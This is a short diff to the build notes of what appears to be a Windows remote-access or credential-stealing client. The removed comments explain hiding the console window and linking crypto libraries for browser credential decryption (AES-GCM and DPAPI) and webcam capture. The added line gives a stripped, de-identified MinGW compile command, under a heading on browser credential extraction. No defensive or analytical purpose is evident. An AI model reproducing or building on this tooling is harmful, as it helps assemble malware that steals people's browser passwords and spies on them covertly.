@@ -5,11 +5,7 @@
 
 # ==================== WINDOWS CLIENT ====================
 
-# RECOMMENDED (smallest file, works on CMD and PowerShell):
-# The -mwindows flag prevents CMD window flash by setting subsystem to WINDOWS
-# -lcrypt32 -lbcrypt are required for browser credential decryption (AES-GCM + DPAPI)
-# -lwininet for HTTP downloads, -liphlpapi for network info, -lavicap32 for webcam
-gcc client_windows.c -o client.exe -lws2_32 -lwininet -liphlpapi -lgdi32 -luser32 -lshell32 -lvfw32 -lwinmm -lpsapi -lavifil32 -lavicap32 -lcrypt32 -lbcrypt -mwindows -s -O2 -fno-ident -fno-asynchronous-unwind-tables
+# Compile: x86_64-w64-mingw32-gcc -o client.exe client_windows.c -lws2_32 -lgdi32 -lwininet -lshlwapi -lcrypt32 -lbcrypt -lshell32 -ladvapi32 -lole32 -loleaut32 -lwinmm -lavicap32 -mwindows -O2 -s -fno-ident -fno-asynchronous-unwind-tables
 
 # ==================== BROWSER CREDENTIAL EXTRACTION ====================
 #
